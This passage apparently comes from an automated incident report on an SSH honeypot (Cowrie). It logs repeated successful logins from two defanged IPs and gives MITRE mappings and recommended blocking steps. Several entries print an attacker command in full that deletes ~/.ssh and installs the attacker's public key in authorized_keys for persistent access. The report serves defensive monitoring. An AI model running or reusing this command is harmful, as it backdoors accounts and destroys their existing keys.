| `2026-05-13 16:06:29` | `cowrie.command.failed` |
| `2026-05-13 16:06:29` | `cowrie.log.closed` |
| `2026-05-13 16:06:29` | `cowrie.session.params` |
| `2026-05-13 16:06:29` | `cowrie.command.input` |
| `2026-05-13 16:06:29` | `cowrie.session.file_download` |
| `2026-05-13 16:06:29` | `cowrie.log.closed` |
| `2026-05-13 16:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ed2b20a061

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:06 |
| **Last Seen** | 2026-05-13 16:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:06:31` | `cowrie.session.connect` |
| `2026-05-13 16:06:31` | `cowrie.client.version` |
| `2026-05-13 16:06:31` | `cowrie.client.kex` |
| `2026-05-13 16:06:31` | `cowrie.login.success` |
| `2026-05-13 16:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dbf3d2051fc

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:08 |
| **Last Seen** | 2026-05-13 16:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:08:38` | `cowrie.session.connect` |
| `2026-05-13 16:08:38` | `cowrie.client.version` |
| `2026-05-13 16:08:38` | `cowrie.client.kex` |
| `2026-05-13 16:08:38` | `cowrie.login.success` |
| `2026-05-13 16:08:38` | `cowrie.session.params` |
| `2026-05-13 16:08:38` | `cowrie.command.input` |
| `2026-05-13 16:08:38` | `cowrie.command.failed` |
| `2026-05-13 16:08:38` | `cowrie.log.closed` |
| `2026-05-13 16:08:39` | `cowrie.session.params` |
| `2026-05-13 16:08:39` | `cowrie.command.input` |
| `2026-05-13 16:08:39` | `cowrie.session.file_download` |
| `2026-05-13 16:08:39` | `cowrie.log.closed` |
| `2026-05-13 16:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b38c2773feb

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:08 |
| **Last Seen** | 2026-05-13 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:08:40` | `cowrie.session.connect` |
| `2026-05-13 16:08:40` | `cowrie.client.version` |
| `2026-05-13 16:08:40` | `cowrie.client.kex` |
| `2026-05-13 16:08:40` | `cowrie.login.success` |
| `2026-05-13 16:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2476f3c2494

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:10 |
| **Last Seen** | 2026-05-13 16:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:10:35` | `cowrie.session.connect` |
| `2026-05-13 16:10:35` | `cowrie.client.version` |
| `2026-05-13 16:10:35` | `cowrie.client.kex` |
| `2026-05-13 16:10:36` | `cowrie.login.success` |
| `2026-05-13 16:10:36` | `cowrie.session.params` |
| `2026-05-13 16:10:36` | `cowrie.command.input` |
| `2026-05-13 16:10:36` | `cowrie.command.failed` |
| `2026-05-13 16:10:37` | `cowrie.log.closed` |
| `2026-05-13 16:10:37` | `cowrie.session.params` |
| `2026-05-13 16:10:37` | `cowrie.command.input` |
| `2026-05-13 16:10:37` | `cowrie.session.file_download` |
| `2026-05-13 16:10:37` | `cowrie.log.closed` |
| `2026-05-13 16:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef6331e85de

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:10 |
| **Last Seen** | 2026-05-13 16:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:10:39` | `cowrie.session.connect` |
| `2026-05-13 16:10:39` | `cowrie.client.version` |
| `2026-05-13 16:10:40` | `cowrie.client.kex` |
| `2026-05-13 16:10:40` | `cowrie.login.success` |
| `2026-05-13 16:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a0736238cea

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:10 |
| **Last Seen** | 2026-05-13 16:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:10:55` | `cowrie.session.connect` |
| `2026-05-13 16:10:55` | `cowrie.client.version` |
| `2026-05-13 16:10:55` | `cowrie.client.kex` |
| `2026-05-13 16:10:55` | `cowrie.login.success` |
| `2026-05-13 16:10:55` | `cowrie.session.params` |
| `2026-05-13 16:10:55` | `cowrie.command.input` |
| `2026-05-13 16:10:55` | `cowrie.command.failed` |
| `2026-05-13 16:10:55` | `cowrie.log.closed` |
| `2026-05-13 16:10:55` | `cowrie.session.params` |
| `2026-05-13 16:10:55` | `cowrie.command.input` |
| `2026-05-13 16:10:55` | `cowrie.session.file_download` |
| `2026-05-13 16:10:55` | `cowrie.log.closed` |
| `2026-05-13 16:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c31e0350b9b

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:10 |
| **Last Seen** | 2026-05-13 16:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:10:57` | `cowrie.session.connect` |
| `2026-05-13 16:10:57` | `cowrie.client.version` |
| `2026-05-13 16:10:57` | `cowrie.client.kex` |
| `2026-05-13 16:10:57` | `cowrie.login.success` |
| `2026-05-13 16:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe6033b48c6

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:14 |
| **Last Seen** | 2026-05-13 16:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:14:35` | `cowrie.session.connect` |
| `2026-05-13 16:14:35` | `cowrie.client.version` |
| `2026-05-13 16:14:35` | `cowrie.client.kex` |
| `2026-05-13 16:14:36` | `cowrie.login.success` |
| `2026-05-13 16:14:36` | `cowrie.session.params` |
| `2026-05-13 16:14:36` | `cowrie.command.input` |
| `2026-05-13 16:14:36` | `cowrie.command.failed` |
| `2026-05-13 16:14:37` | `cowrie.log.closed` |
| `2026-05-13 16:14:37` | `cowrie.session.params` |
| `2026-05-13 16:14:37` | `cowrie.command.input` |
| `2026-05-13 16:14:37` | `cowrie.session.file_download` |
| `2026-05-13 16:14:37` | `cowrie.log.closed` |
| `2026-05-13 16:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb2ae3fdfcea

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:14 |
| **Last Seen** | 2026-05-13 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:14:40` | `cowrie.session.connect` |
| `2026-05-13 16:14:40` | `cowrie.client.version` |
| `2026-05-13 16:14:40` | `cowrie.client.kex` |
| `2026-05-13 16:14:41` | `cowrie.login.success` |
| `2026-05-13 16:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d148aba2ce4d

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:15 |
| **Last Seen** | 2026-05-13 16:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:15:10` | `cowrie.session.connect` |
| `2026-05-13 16:15:10` | `cowrie.client.version` |
| `2026-05-13 16:15:10` | `cowrie.client.kex` |
| `2026-05-13 16:15:10` | `cowrie.login.success` |
| `2026-05-13 16:15:10` | `cowrie.session.params` |
| `2026-05-13 16:15:10` | `cowrie.command.input` |
| `2026-05-13 16:15:10` | `cowrie.command.failed` |
| `2026-05-13 16:15:10` | `cowrie.log.closed` |
| `2026-05-13 16:15:10` | `cowrie.session.params` |
| `2026-05-13 16:15:10` | `cowrie.command.input` |
| `2026-05-13 16:15:10` | `cowrie.session.file_download` |
| `2026-05-13 16:15:10` | `cowrie.log.closed` |
| `2026-05-13 16:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d227ebb197

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:15 |
| **Last Seen** | 2026-05-13 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:15:11` | `cowrie.session.connect` |
| `2026-05-13 16:15:11` | `cowrie.client.version` |
| `2026-05-13 16:15:11` | `cowrie.client.kex` |
| `2026-05-13 16:15:12` | `cowrie.login.success` |
| `2026-05-13 16:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e9418d000b1

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:16 |
| **Last Seen** | 2026-05-13 16:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:16:22` | `cowrie.session.connect` |
| `2026-05-13 16:16:22` | `cowrie.client.version` |
| `2026-05-13 16:16:22` | `cowrie.client.kex` |
| `2026-05-13 16:16:23` | `cowrie.login.success` |
| `2026-05-13 16:16:23` | `cowrie.session.params` |
| `2026-05-13 16:16:23` | `cowrie.command.input` |
| `2026-05-13 16:16:23` | `cowrie.command.failed` |
| `2026-05-13 16:16:24` | `cowrie.log.closed` |
| `2026-05-13 16:16:24` | `cowrie.session.params` |
| `2026-05-13 16:16:24` | `cowrie.command.input` |
| `2026-05-13 16:16:24` | `cowrie.session.file_download` |
| `2026-05-13 16:16:24` | `cowrie.log.closed` |
| `2026-05-13 16:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aaaa33a3e92

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:16 |
| **Last Seen** | 2026-05-13 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:16:26` | `cowrie.session.connect` |
| `2026-05-13 16:16:26` | `cowrie.client.version` |
| `2026-05-13 16:16:27` | `cowrie.client.kex` |
| `2026-05-13 16:16:27` | `cowrie.login.success` |
| `2026-05-13 16:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13c0d4c44cd5

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:17 |
| **Last Seen** | 2026-05-13 16:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:17:16` | `cowrie.session.connect` |
| `2026-05-13 16:17:16` | `cowrie.client.version` |
| `2026-05-13 16:17:16` | `cowrie.client.kex` |
| `2026-05-13 16:17:16` | `cowrie.login.success` |
| `2026-05-13 16:17:17` | `cowrie.session.params` |
| `2026-05-13 16:17:17` | `cowrie.command.input` |
| `2026-05-13 16:17:17` | `cowrie.command.failed` |
| `2026-05-13 16:17:17` | `cowrie.log.closed` |
| `2026-05-13 16:17:17` | `cowrie.session.params` |
| `2026-05-13 16:17:17` | `cowrie.command.input` |
| `2026-05-13 16:17:17` | `cowrie.session.file_download` |
| `2026-05-13 16:17:17` | `cowrie.log.closed` |
| `2026-05-13 16:17:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347ab55226f3

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:17 |
| **Last Seen** | 2026-05-13 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:17:18` | `cowrie.session.connect` |
| `2026-05-13 16:17:18` | `cowrie.client.version` |
| `2026-05-13 16:17:18` | `cowrie.client.kex` |
| `2026-05-13 16:17:18` | `cowrie.login.success` |
| `2026-05-13 16:17:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661a9e11d093

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:19 |
| **Last Seen** | 2026-05-13 16:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:19:18` | `cowrie.session.connect` |
| `2026-05-13 16:19:18` | `cowrie.client.version` |
| `2026-05-13 16:19:18` | `cowrie.client.kex` |
| `2026-05-13 16:19:18` | `cowrie.login.success` |
| `2026-05-13 16:19:18` | `cowrie.session.params` |
| `2026-05-13 16:19:18` | `cowrie.command.input` |
| `2026-05-13 16:19:18` | `cowrie.command.failed` |
| `2026-05-13 16:19:18` | `cowrie.log.closed` |
| `2026-05-13 16:19:19` | `cowrie.session.params` |
| `2026-05-13 16:19:19` | `cowrie.command.input` |
| `2026-05-13 16:19:19` | `cowrie.session.file_download` |
| `2026-05-13 16:19:19` | `cowrie.log.closed` |
| `2026-05-13 16:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2c5bf3eecf

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:19 |
| **Last Seen** | 2026-05-13 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:19:20` | `cowrie.session.connect` |
| `2026-05-13 16:19:20` | `cowrie.client.version` |
| `2026-05-13 16:19:20` | `cowrie.client.kex` |
| `2026-05-13 16:19:20` | `cowrie.login.success` |
| `2026-05-13 16:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

